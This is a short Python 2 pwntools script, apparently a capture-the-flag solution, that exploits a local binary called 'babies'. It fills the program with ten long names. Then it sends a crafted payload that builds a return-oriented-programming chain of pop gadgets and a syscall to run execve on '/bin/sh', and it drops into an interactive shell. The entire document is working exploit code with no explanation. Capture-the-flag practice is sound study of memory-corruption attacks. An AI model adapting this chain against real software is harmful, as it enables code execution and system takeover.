#!/usr/bin/python2

from pwn import *


execve = 0x3b
bin_sh = 0x4009E9
pop_rdi_ret = 0x400973
pop_rsi_pop_r15_ret = 0x400971
syscall = 0x4008c8


def add_baby(io, name='A'*98):
    io.sendlineafter(':\n', name)

def main():
    io = process("./babies")
    for i in range(10):
        add_baby(io)
    payload = 'A' * 8 + \
              p64(execve - 1) + \
              'B' * 4 + \
              p64(pop_rdi_ret) + \
              p64(bin_sh) + \
              p64(pop_rsi_pop_r15_ret) + \
              p64(0) + \
              p64(0) + \
              p64(syscall)
    add_baby(io, payload)
    add_baby(io, '')
    io.interactive()


if __name__ == '__main__':
    main()
